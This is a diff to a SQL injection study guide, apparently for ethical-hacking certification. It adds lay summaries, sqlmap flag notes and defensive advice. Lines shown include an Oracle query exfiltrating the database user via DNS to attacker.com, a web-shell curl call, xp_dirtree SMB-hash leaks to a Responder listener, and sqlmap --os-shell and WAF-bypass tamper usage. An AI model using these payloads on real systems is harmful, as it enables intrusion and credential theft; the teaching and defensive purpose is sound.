@@ -53,6 +53,14 @@
 
 ---
 
+> [!TIP]
+> **💡 In Simple Words — What Module 15 Is Really About:**  
+> Imagine filling out a bank form asking for your name, and instead of typing `"John"`, you write: `"John' — AND empty all accounts!"` If the clerk blindly pastes your words straight into their instruction sheet, **SQL Injection** happens!  
+> - **In-Band (`UNION` / Error):** The database prints answers right onto the webpage in front of you! (Remember the 2 UNION rules: **exact same number of columns** + **matching data types**.)  
+> - **Blind SQLi (Boolean / Time):** The page prints nothing secret — so you play *"20 Questions"*, either checking if *"Page A differs from Page B"* (**Boolean**) or telling the DB *"If the first letter is 'a', sleep for 5 seconds"* (**Time-Based**).  
+> - **Out-of-Band (OOB):** Telling the database to secretly whisper stolen passwords outward inside a DNS lookup to your domain!  
+> - **The #1 Cure:** **Prepared Statements (Parameterized Queries)** — keeping SQL commands and user data in completely separate boxes!
+
 ## 1. SQL Injection Architecture & Mechanics
 
 ### The Fundamental Flaw: Code vs. Data Confusion
@@ -117,7 +125,8 @@ flowchart TD
     class Step1,Step2,Step3,Step4,Step5 default;
 ```
 
-#### The 2 Golden Rules of UNION Attacks (Must-Know CEH Concept)
+#### The 2 Golden Rules of UNION Attacks
+*(Must-Know CEH Concept)*
 1. **Equal Number of Columns**: The injected `SELECT` statement **must return the exact same number of columns** as the original query.
 2. **Compatible Data Types**: The data types of corresponding columns in both queries must be mutually compatible (e.g., cannot place a string into an integer column in strict databases like Oracle or PostgreSQL).
 
@@ -223,6 +232,9 @@ When egress network traffic is restricted but external DNS resolution is permitt
 SELECT UTL_INADDR.get_host_address((SELECT user FROM dual) || '.attacker.com') FROM dual;
 ```
 
+### DNS Exfiltration & SMB Relay Mechanics
+Besides exfiltrating secrets via subdomain DNS queries (`password.attacker.com`), UNC paths (`\\attacker_IP\share`) inside MSSQL `xp_dirtree` force the database Windows server to attempt outbound SMB authentication to the attacker's **Responder** listener — leaking its NetNTLMv2 hash for cracking or relay!
+
 ---
 
 ## 5. Cross-Database Fingerprinting & Dialects
@@ -274,7 +286,7 @@ curl "http://target.com/shell.php?cmd=id;whoami"
 
 ---
 
-### Reading Host Files
+### Reading Host Files: `LOAD_FILE()` and `pg_read_file()`
 
 ```sql
 -- MySQL: Reading sensitive files from disk
@@ -330,6 +342,11 @@ sqlmap -u "http://target.com/profile.php?id=10" --os-shell
 sqlmap -u "http://target.com/profile.php?id=10" --tamper=space2comment,between,randomcase
 ```
 
+### Database Enumeration, Shell Spawning, and Tamper Scripts
+* **`--dbs` / `-D <db> --tables` / `--dump`:** Systematically enumerates databases, tables, and dumps extracted rows cleanly to CSV.
+* **`--os-shell` / `--os-pwn`:** Automatically leverages `xp_cmdshell` (MSSQL) or `INTO OUTFILE` UDF/webshell uploads (MySQL) to give an interactive OS command prompt.
+* **`--tamper=...`:** Rewrites payloads on the fly (e.g., replacing spaces with `/**/` comments via `space2comment` or alternating case via `randomcase`) to bypass naive WAF signatures.
+
 ---
 
 ## 8. Defensive Hardening & Countermeasures
@@ -353,6 +370,10 @@ $stmt = $pdo->prepare('SELECT id, email FROM accounts WHERE username = :user');
 $stmt->execute(['user' => $userInput]);
 $user = $stmt->fetch();
 ```
+
+### Secondary Defenses: Stored Procedures & Principle of Least Privilege
+* **Parameterized Stored Procedures:** Stored procedures only protect against SQLi when they use typed parameters — building dynamic `EXEC('SELECT...' + @var)` strings inside a stored procedure is still vulnerable!
+* **Least Privilege:** Web applications must never connect as `sa`, `root`, or `postgres`. Grant strictly the minimum `SELECT`/`INSERT`/`UPDATE` permissions required, and disable `xp_cmdshell` and `FILE` privileges.
 
 ---
 
